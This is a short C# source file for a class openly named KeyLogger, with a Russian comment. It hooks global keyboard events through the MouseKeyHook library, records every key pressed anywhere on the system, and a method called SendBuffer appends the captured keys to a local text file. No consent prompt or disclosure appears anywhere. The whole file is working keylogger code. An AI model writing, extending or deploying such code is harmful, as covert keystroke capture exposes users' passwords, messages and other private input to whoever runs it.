using System;
using System.IO;
using System.Text;
using Gma.System.MouseKeyHook;

public static class KeyLogger
{
	private static IKeyboardMouseEvents hook;
	private static StringBuilder buffer = new StringBuilder(); 
	private static string logFile = Path.Combine("123.txt"); // полный путь к файлу

	public static void Start()
	{
		hook = Hook.GlobalEvents();
		hook.KeyDown += OnKeyDown;
	}

	private static void OnKeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
	{
		string key = e.KeyCode.ToString();
		buffer.Append(key + " ");
	}

	public static void SendBuffer()
	{
		if (buffer.Length > 0)
		{
			File.AppendAllText(logFile, buffer.ToString() + "\n");
			buffer.Clear();
		}
	}
}
